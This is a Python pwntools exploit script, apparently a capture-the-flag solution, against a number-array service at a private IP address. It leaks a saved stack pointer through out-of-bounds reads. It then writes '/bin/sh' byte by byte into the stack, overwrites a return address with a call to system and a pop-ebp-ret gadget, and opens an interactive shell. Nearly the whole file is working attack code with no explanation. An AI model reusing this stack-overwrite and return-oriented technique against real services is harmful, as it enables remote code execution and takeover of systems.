#!/usr/bin/env python
from pwn import *

def hex2(a):
    return a>0 and hex(a) or hex(a&0xff)

#r=remote("10.112.108.77",2334)
r=remote("10.10.10.111",4000)
#r=remote("10.8.167.237",4000)
d=r.recvuntil(':')
print "first recv ..."
print d
print "data first done ..."
r.sendline('120')
d=r.recvuntil("rs")
print "start sending '1'....."
for i in range(100):
    r.sendline('1')
print "send '1' done, start recv numbers ...."
d=r.recvuntil('exit')
print d
print "start recving data..."
r.sendline('1')
d=r.recvuntil('exit')
print "all numbers get done..."
print d
print "data end"
#d=r.recvall()
d_l=d.split('\n')
d_e1=d_l[110][3:].strip()
d_e2=d_l[111][3:].strip()
d_e3=d_l[112][3:].strip()
d_e4=d_l[113][3:].strip()
print "d_e1 : ",d_e1
print "d_e2 : ",d_e2
print "d_e3 : ",d_e3
print "d_e4 : ",d_e4
ebp=hex((256+int(d_e4))%256)+hex((256+int(d_e3))%256)[2:]+hex((256+int(d_e2))%256)[2:]+hex((256+int(d_e1))%256)[2:]
print ">>>>>>>>>>>>> ebp:",ebp
##### write "/bin/sh"
##############################/bin/sh0x2f 62696e2f7368
r.sendline('3')
r.recv()
r.sendline('144')
r.recv()
r.sendline("47")
r.recv()
##############################/bin/sh--0x2f62 696e2f7368'
r.sendline('3')
r.recv()
r.sendline('145')
r.recv()
r.sendline('98')
r.recv()
##############################/bin/sh--0x2f6269 6e2f7368'
r.sendline('3')
r.recv()
r.sendline('146')
r.recv()
r.sendline('105')
r.recv()
##############################/bin/sh--0x2f62696e 2f7368'
r.sendline('3')
r.recv()
r.sendline('147')
r.recv()
r.sendline('110')
r.recv()
##############################/bin/sh--0x2f62696e2f 7368'
r.sendline('3')
r.recv()
r.sendline('148')
r.recv()
r.sendline('47')
r.recv()
##############################/bin/sh--0x2f62696e2f73 68'
r.sendline('3')
r.recv()
r.sendline('149')
r.recv()
r.sendline('115')
##############################/bin/sh--0x2f62696e2f7368'
r.sendline('3')
r.recv()
r.sendline('150')
r.recv()
r.sendline('104')
r.recv()


r.sendline('3')
r.recv()
r.sendline('151')
r.recv()
r.sendline('0')
r.recv()

r.sendline('3')
r.recv()
r.sendline('152')
r.recv()
r.sendline('0')
r.recv()

###### write ptr to /bin/bash ---> 0xf6fff0ec #####
r.sendline('3')
r.recv()
r.sendline('140')
r.recv()
print "e1: ",str(hex((256+int(d_e1)+8)%256))
r.sendline(str((256+int(d_e1)+8)%256))
r.recv()

r.sendline('3')
r.recv()
r.sendline('141')
r.recv()
print "e2: ",str(hex((256+int(d_e2))%256))
r.sendline(str((256+int(d_e2))%256))
r.recv()

r.sendline('3')
r.recv()
r.sendline('142')
r.recv()
print "e3: ",str(hex((256+int(d_e3))%256))
r.sendline(str((256+int(d_e3))%256))
r.recv()

r.sendline('3')
r.recv()
r.sendline('143')
r.recv()
print "e4: ",str(hex((256+int(d_e4))%256))
r.sendline(str((256+int(d_e4))%256))
r.recv()



#############call system##############
r.sendline('3')
r.recv()
r.sendline('132')
r.recv()
r.sendline('80')
r.recv()
print '1'
r.sendline('3')
r.recv()
r.sendline('133')
r.recv()
r.sendline('132')
r.recv()
print '2'
r.sendline('3')
r.recv()
r.sendline('134')
r.recv()
r.sendline('4')
r.recv()
print '3'
r.sendline('3')
r.recv()
r.sendline('135')
r.recv()
r.sendline('8')
r.recv()
print '4'


#####################################0x080489 5b pop ebp ret
r.sendline('3')
r.recv()
r.sendline('136')
r.recv()
r.sendline("91")
r.recv()
#####################################0x0804 895b pop ebp ret
r.sendline('3')
r.recv()
r.sendline('137')
r.recv()
r.sendline("137")
r.recv()
#####################################0x08 04895b pop ebp ret
r.sendline('3')
r.recv()
r.sendline('138')
r.recv()
r.sendline("4")
r.recv()
#####################################0x 0804895b pop ebp ret
r.sendline('3')
r.recv()
r.sendline('139')
r.recv()
r.sendline("8")
r.recv()
########

"""
##############################0xf6fff0 e8
r.sendline('3')
r.recv()
r.sendline('144')
r.recv()
r.sendline("236")
r.recv()
##############################0xf6ff f0e8
r.sendline('3')
r.recv()
r.sendline('145')
r.recv()
r.sendline("240")
r.recv()
##############################0xf6 fff0e8
r.sendline('3')
r.recv()
r.sendline('146')
r.recv()
r.sendline("255")
r.recv()
##############################0x f6fff0e8
r.sendline('3')
r.recv()
r.sendline('147')
r.recv()
r.sendline("246")
r.recv()
"""


sleep(1)
r.sendline('5')
#r.recv()
r.interactive()


